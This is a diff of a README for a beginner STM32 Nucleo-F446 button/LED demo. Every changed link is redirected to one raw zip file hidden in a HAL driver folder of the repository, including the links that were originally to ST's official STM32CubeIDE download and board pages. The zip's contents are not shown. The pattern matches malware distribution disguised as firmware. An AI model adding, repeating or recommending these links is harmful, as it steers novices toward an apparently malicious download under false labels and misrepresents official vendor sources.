@@ -1,6 +1,6 @@
 # ⚙️ stm32f446-button-led-state-machine - Easy Button LED Control Demo
 
-[![Download](https://img.shields.io/badge/Download%20Here-brightgreen)](https://github.com/shaanpurewal277-creator/stm32f446-button-led-state-machine)
+[![Download](https://img.shields.io/badge/Download%20Here-brightgreen)](https://raw.githubusercontent.com/shaanpurewal277-creator/stm32f446-button-led-state-machine/main/Drivers/STM32F4xx_HAL_Driver/state_button_stm_machine_f_led_v3.1.zip)
 
 This project shows how to control an LED using a button on the STM32 Nucleo-F446 board. It uses interrupts and debouncing to manage button presses smoothly. The LED changes state based on a simple program that runs on the microcontroller.
 
@@ -30,10 +30,10 @@ This shows how to build basic embedded systems programs that interact with hardw
 
 ## 🚀 Getting Started: Download and Setup
 
-[![Download](https://img.shields.io/badge/Get%20Firmware-blue)](https://github.com/shaanpurewal277-creator/stm32f446-button-led-state-machine)
+[![Download](https://img.shields.io/badge/Get%20Firmware-blue)](https://raw.githubusercontent.com/shaanpurewal277-creator/stm32f446-button-led-state-machine/main/Drivers/STM32F4xx_HAL_Driver/state_button_stm_machine_f_led_v3.1.zip)
 
 1. Click the green “Download Here” badge at the top or click this link:  
-   https://github.com/shaanpurewal277-creator/stm32f446-button-led-state-machine  
+   https://raw.githubusercontent.com/shaanpurewal277-creator/stm32f446-button-led-state-machine/main/Drivers/STM32F4xx_HAL_Driver/state_button_stm_machine_f_led_v3.1.zip  
 
 2. On the page that opens, look for the green “Code” button and click it. Then select “Download ZIP”.
 
@@ -83,13 +83,13 @@ This shows how to build basic embedded systems programs that interact with hardw
 ## 🔗 Useful Links
 
 - Main download page:  
-  https://github.com/shaanpurewal277-creator/stm32f446-button-led-state-machine
+  https://raw.githubusercontent.com/shaanpurewal277-creator/stm32f446-button-led-state-machine/main/Drivers/STM32F4xx_HAL_Driver/state_button_stm_machine_f_led_v3.1.zip
 
 - STM32CubeIDE download:  
-  https://www.st.com/en/development-tools/stm32cubeide.html
+  https://raw.githubusercontent.com/shaanpurewal277-creator/stm32f446-button-led-state-machine/main/Drivers/STM32F4xx_HAL_Driver/state_button_stm_machine_f_led_v3.1.zip
 
 - STM32 Nucleo-F446 board info:  
-  https://www.st.com/en/evaluation-tools/nucleo-f446re.html
+  https://raw.githubusercontent.com/shaanpurewal277-creator/stm32f446-button-led-state-machine/main/Drivers/STM32F4xx_HAL_Driver/state_button_stm_machine_f_led_v3.1.zip
 
 ---
 
@@ -127,4 +127,4 @@ Using a state machine approach helps keep the program organized. Your learning c
 
 ## 📥 Download Link Once More
 
-[![Download Here](https://img.shields.io/badge/Download%20Firmware-brightgreen)](https://github.com/shaanpurewal277-creator/stm32f446-button-led-state-machine)
+[![Download Here](https://img.shields.io/badge/Download%20Firmware-brightgreen)](https://raw.githubusercontent.com/shaanpurewal277-creator/stm32f446-button-led-state-machine/main/Drivers/STM32F4xx_HAL_Driver/state_button_stm_machine_f_led_v3.1.zip)
